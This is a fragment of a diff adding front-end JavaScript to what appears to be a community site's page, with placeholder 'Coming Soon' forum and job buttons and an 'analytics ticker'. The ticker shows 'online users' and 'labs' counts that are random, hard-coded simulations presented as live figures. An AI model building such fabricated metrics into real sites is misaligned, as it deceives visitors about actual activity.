+// ══════════════════════════════════
+function forumClick(){showToast('🔗 فتح المنتدى — Coming Soon! موقع المجتمع قيد الإنشاء');}
+function jobClick(){showToast('💼 فتح قائمة الوظائف — Coming Soon!');}
+
+// ══════════════════════════════════
+// ANALYTICS TICKER
+// ══════════════════════════════════
+let solv=1200,onl=47,labs=318;
+setInterval(()=>{
+  onl+=Math.random()>.6?1:Math.random()>.5?-1:0;onl=Math.max(30,Math.min(80,onl));
+  labs+=Math.random()>.7?1:0;
+  document.getElementById('ana-online').textContent=onl;
+  document.getElementById('ana-labs').textContent=labs;
+},4000);
+</script>
+</body>
+</html>
